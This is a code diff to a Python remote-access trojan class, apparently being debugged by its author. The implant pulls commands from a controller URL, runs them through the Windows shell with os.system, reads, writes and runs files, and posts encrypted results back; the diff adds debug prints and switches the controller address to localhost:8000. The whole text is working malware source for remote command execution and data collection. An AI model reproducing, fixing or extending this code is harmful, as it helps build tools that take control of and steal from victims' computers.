@@ -33,6 +33,7 @@ class Trojan:
         return commands
     
     def sendoutcome(self, outcome: dict) -> str:
+        print('in sendoutcome')
         data = parse.urlencode(encrypt(outcome)).encode('utf-8')
         req = request.Request(self.commandurl, data=data, headers = self.headers)
         with request.urlopen(req) as response:
@@ -49,13 +50,16 @@ class Trojan:
         commands = self.commands()
         print(commands)
         outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
+        print(commands)
         for key, values in commands.items():
+            print(key, values)
             if key.lower() == 'cmd':
-                for cmd in values:
-                    output = os.system('cmd /c "%s"'% cmd)
+                for cmd in values: #just keeps running seemingly random values
+                    output = os.system('cmd /c "%s"'% cmd) 
                     if output == -1:
                         output = subprocess.check_output(shlex.split("systeminfo"), stderr=subprocess.STDOUT)
                     commands['cmd'].append(output)
+                    print('ran %s: %s' % (cmd, output))
             elif key.lower() == 'file-read':
                 for value in values:
                     try:
@@ -95,5 +99,5 @@ class Trojan:
                 
             
 if __name__ == '__main__':  
-    trojan = Trojan('http://localhost:4567', computerid='dht-11')
+    trojan = Trojan('http://localhost:8000', computerid='dht-11')
     trojan.run()
